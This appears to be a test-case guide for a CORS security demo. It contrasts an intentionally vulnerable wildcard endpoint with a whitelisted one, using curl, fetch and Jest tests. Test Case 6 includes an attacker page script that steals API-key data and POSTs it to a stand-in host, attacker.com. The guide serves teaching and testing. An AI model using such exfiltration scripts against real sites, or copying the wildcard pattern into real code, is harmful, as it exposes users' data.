# CORS Security - Test Cases

## 📊 Test Scenarios

### Test Case 1: Vulnerable Endpoint - Any Origin

**Objective**: Demonstrate that vulnerable endpoint accepts any origin

**Setup**:
```bash
# Ensure CORS_WHITELIST is set in .env
CORS_WHITELIST=http://localhost:3000
```

**Test 1.1: Attack from Different Domain**
```bash
curl -X GET http://localhost:3000/cors/insecure-data \
  -H "Origin: https://attacker.com" \
  -v
```

**Expected Result**: ✅ 200 OK
```
< Access-Control-Allow-Origin: *
< HTTP/1.1 200 OK
{
  "source": "insecure",
  "data": { "apiKey": "demo-api-key-123", ... }
}
```

**Test 1.2: Attack from Localhost**
```bash
curl -X GET http://localhost:3000/cors/insecure-data \
  -H "Origin: http://localhost:8080" \
  -v
```

**Expected Result**: ✅ 200 OK (with wildcard CORS header)

**Test 1.3: Browser Fetch Simulation**
```javascript
// In browser console at http://localhost:3000
fetch('http://localhost:3000/cors/insecure-data', {
  method: 'GET',
  headers: { 'Content-Type': 'application/json' }
}).then(r => r.json()).then(d => console.log(d))

// Result: ✅ Data fetched successfully
// Sensitive data exposed!
```

---

### Test Case 2: Secure Endpoint - Non-Whitelisted Origin

**Objective**: Verify that secure endpoint rejects non-whitelisted origins

**Test 2.1: Request from Attacker Domain**
```bash
curl -X GET http://localhost:3000/cors/secure-data \
  -H "Origin: https://attacker.com" \
  -v
```

**Expected Result**: ❌ 403 Forbidden
```
< HTTP/1.1 403 Forbidden
{
  "source": "secure",
  "message": "Origin is not allowed by the CORS whitelist.",
  "error": "CORS policy violation"
}
```

**Test 2.2: Browser Fetch from Non-Whitelisted Origin**
```javascript
// Browser at https://attacker.com
fetch('http://localhost:3000/cors/secure-data')
  .then(r => r.json())
  .catch(e => console.error(e))

// Result: ❌ CORS policy: Cross-origin request blocked
// Browser blocks the request (after server returns 403)
```

**Test 2.3: OPTIONS Preflight Request**
```bash
curl -X OPTIONS http://localhost:3000/cors/secure-data \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: GET" \
  -v
```

**Expected Result**: ❌ 403 Forbidden

---

### Test Case 3: Secure Endpoint - Whitelisted Origin

**Objective**: Verify that secure endpoint accepts whitelisted origins

**Test 3.1: Request from Whitelisted Domain**
```bash
curl -X GET http://localhost:3000/cors/secure-data \
  -H "Origin: http://localhost:3000" \
  -v
```

**Expected Result**: ✅ 200 OK
```
< Access-Control-Allow-Origin: http://localhost:3000
< HTTP/1.1 200 OK
{
  "source": "secure",
  "message": "Only whitelisted origins can read this payload.",
  "data": { "apiKey": "demo-api-key-123", ... }
}
```

**Test 3.2: Multiple Whitelisted Origins**

**Setup**:
```env
CORS_WHITELIST=http://localhost:3000,https://yourdomain.com,https://app.example.com
```

**Test**:
```bash
# Test with each origin
curl -X GET http://localhost:3000/cors/secure-data \
  -H "Origin: https://yourdomain.com" \
  -v

curl -X GET http://localhost:3000/cors/secure-data \
  -H "Origin: https://app.example.com" \
  -v
```

**Expected Result**: ✅ 200 OK for both

**Test 3.3: Browser Fetch from Whitelisted Origin**
```javascript
// Browser at http://localhost:3000
fetch('http://localhost:3000/cors/secure-data')
  .then(r => r.json())
  .then(d => console.log('Success:', d))

// Result: ✅ Data fetched successfully
// Access granted!
```

---

### Test Case 4: CORS Headers Validation

**Objective**: Verify correct CORS headers are set

**Test 4.1: Check Vary Header**
```bash
curl -I http://localhost:3000/cors/secure-data \
  -H "Origin: http://localhost:3000"
```

**Expected Headers**:
```
Vary: Origin
Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

**Test 4.2: Verify Wildcard NOT Present in Secure Endpoint**
```bash
curl -I http://localhost:3000/cors/secure-data \
  -H "Origin: https://any-domain.com"
```

**Must NOT contain**:
```
Access-Control-Allow-Origin: *
```

---

### Test Case 5: Config Endpoint

**Objective**: Verify whitelist configuration is readable

**Test 5.1: Get Current Config**
```bash
curl -X GET http://localhost:3000/cors/config \
  -H "Origin: http://localhost:3000"
```

**Expected Response**:
```json
{
  "whitelist": ["http://localhost:3000", "https://yourdomain.com"],
  "currentOrigin": "http://localhost:3000",
  "isOriginAllowed": true
}
```

**Test 5.2: Check Non-Whitelisted Config**
```bash
curl -X GET http://localhost:3000/cors/config \
  -H "Origin: https://attacker.com"
```

**Expected Response**:
```json
{
  "whitelist": ["http://localhost:3000", "https://yourdomain.com"],
  "currentOrigin": "https://attacker.com",
  "isOriginAllowed": false
}
```

---

### Test Case 6: Data Exfiltration Attack Flow

**Objective**: Complete attack scenario demonstration

**Setup Files**:

**attacker.com/steal.html** (simulate on different port):
```html
<script>
  // Attack 1: Try vulnerable endpoint
  console.log('🚀 Attack 1: Stealing from insecure endpoint...')
  fetch('http://localhost:3000/cors/insecure-data', {
    method: 'GET'
  })
  .then(r => r.json())
  .then(data => {
    console.log('✅ Success! Stolen data:', data)
    // Send to attacker server
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(data)
    })
  })

  // Attack 2: Try secure endpoint (will fail)
  console.log('🚀 Attack 2: Trying secure endpoint...')
  fetch('http://localhost:3000/cors/secure-data', {
    method: 'GET'
  })
  .then(r => r.json())
  .catch(e => console.log('❌ Failed:', e.message))
</script>
```

**Test**:
```bash
# Run attacker page on different port
python -m http.server 8000

# Open http://localhost:8000/steal.html
# Check console:
# ✅ Attack 1 succeeds (data exfiltrated!)
# ❌ Attack 2 fails (secure endpoint protected)
```

---

### Test Case 7: Edge Cases

**Test 7.1: Empty Origin Header**
```bash
curl -X GET http://localhost:3000/cors/secure-data
# No Origin header
```

**Expected**: May return data (no origin = same-origin request)

**Test 7.2: Malformed Whitelist**
```env
CORS_WHITELIST=  http://localhost:3000  ,  https://domain.com  
```

**Expected**: Should handle whitespace and work correctly

**Test 7.3: Special Characters in Origin**
```bash
curl -X GET http://localhost:3000/cors/secure-data \
  -H "Origin: https://domain.com:3000" \
  -v
```

**Expected**: Exact match required (port matters!)

**Test 7.4: Protocol Mismatch**
```bash
# Whitelist: https://domain.com
# Request Origin: http://domain.com (HTTP not HTTPS)

curl -X GET http://localhost:3000/cors/secure-data \
  -H "Origin: http://domain.com"
```

**Expected**: ❌ 403 Forbidden (protocol must match exactly)

---

## 🧪 Automated Test Suite

### Using cURL

```bash
#!/bin/bash

echo "CORS Security Test Suite"
echo "========================"

BASE_URL="http://localhost:3000/cors"

# Test 1: Vulnerable endpoint
echo -e "\n✅ Test 1: Vulnerable endpoint (should allow any origin)"
curl -s -H "Origin: https://attacker.com" "$BASE_URL/insecure-data" | jq '.source'

# Test 2: Secure endpoint - rejected
echo -e "\n❌ Test 2: Secure endpoint (should reject non-whitelisted)"
curl -s -H "Origin: https://attacker.com" "$BASE_URL/secure-data" | jq '.error'

# Test 3: Secure endpoint - allowed
echo -e "\n✅ Test 3: Secure endpoint (should allow whitelisted)"
curl -s -H "Origin: http://localhost:3000" "$BASE_URL/secure-data" | jq '.source'

# Test 4: Config
echo -e "\n⚙️ Test 4: Config endpoint"
curl -s -H "Origin: http://localhost:3000" "$BASE_URL/config" | jq '.whitelist'
```

### Using JavaScript/Jest

```javascript
describe('CORS Security', () => {
  const BASE_URL = 'http://localhost:3000/cors'

  test('Vulnerable endpoint accepts any origin', async () => {
    const res = await fetch(`${BASE_URL}/insecure-data`, {
      headers: { 'Origin': 'https://attacker.com' }
    })
    expect(res.status).toBe(200)
    expect(res.headers.get('Access-Control-Allow-Origin')).toBe('*')
  })

  test('Secure endpoint rejects non-whitelisted origin', async () => {
    const res = await fetch(`${BASE_URL}/secure-data`, {
      headers: { 'Origin': 'https://attacker.com' }
    })
    expect(res.status).toBe(403)
  })

  test('Secure endpoint allows whitelisted origin', async () => {
    const res = await fetch(`${BASE_URL}/secure-data`, {
      headers: { 'Origin': 'http://localhost:3000' }
    })
    expect(res.status).toBe(200)
  })
})
```

---

## 📝 Test Checklist

- [ ] Vulnerable endpoint accepts wildcard requests
- [ ] Vulnerable endpoint returns sensitive data
- [ ] Secure endpoint rejects non-whitelisted origins
- [ ] Secure endpoint accepts whitelisted origins
- [ ] CORS headers are correctly set
- [ ] Vary header is present
- [ ] Wildcard not used in secure endpoint
- [ ] Preflight (OPTIONS) requests handled
- [ ] Config endpoint shows whitelist
- [ ] Edge cases handled correctly

---

**Status**: ✅ Ready for Testing  
**Last Updated**: December 2024
